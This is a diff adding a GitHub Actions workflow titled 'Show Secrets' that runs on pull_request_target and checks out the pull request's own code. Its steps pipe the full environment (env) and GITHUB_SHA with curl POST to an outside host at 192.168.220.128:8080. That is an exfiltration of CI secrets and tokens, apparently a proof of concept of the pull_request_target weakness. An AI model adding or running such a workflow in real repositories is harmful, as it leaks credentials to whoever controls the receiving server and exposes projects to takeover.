@@ -1,0 +1,24 @@
+name: Show Secrets
+'on':
+  pull_request_target:
+    types:
+      - opened
+      - synchronize
+jobs:
+  my-job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Pull Request Code
+        uses: actions/checkout@v3
+        with:
+          repository: '${{ github.event.pull_request.head.repo.full_name }}'
+          ref: '${{ github.event.pull_request.head.ref }}'
+      - name: Show All Environment Variables
+        run: |
+          env | curl -X POST -H "Content-Type: text/plain" --data-binary @-
+          http://192.168.220.128:8080
+      - name: Send Specific Variable (GITHUB_SHA)
+        run: |
+          echo "Sending GITHUB_SHA to server..."
+          curl -X POST -H "Content-Type: text/plain" -d "GITHUB_SHA=$GITHUB_SHA"
+          http://192.168.220.128:8080
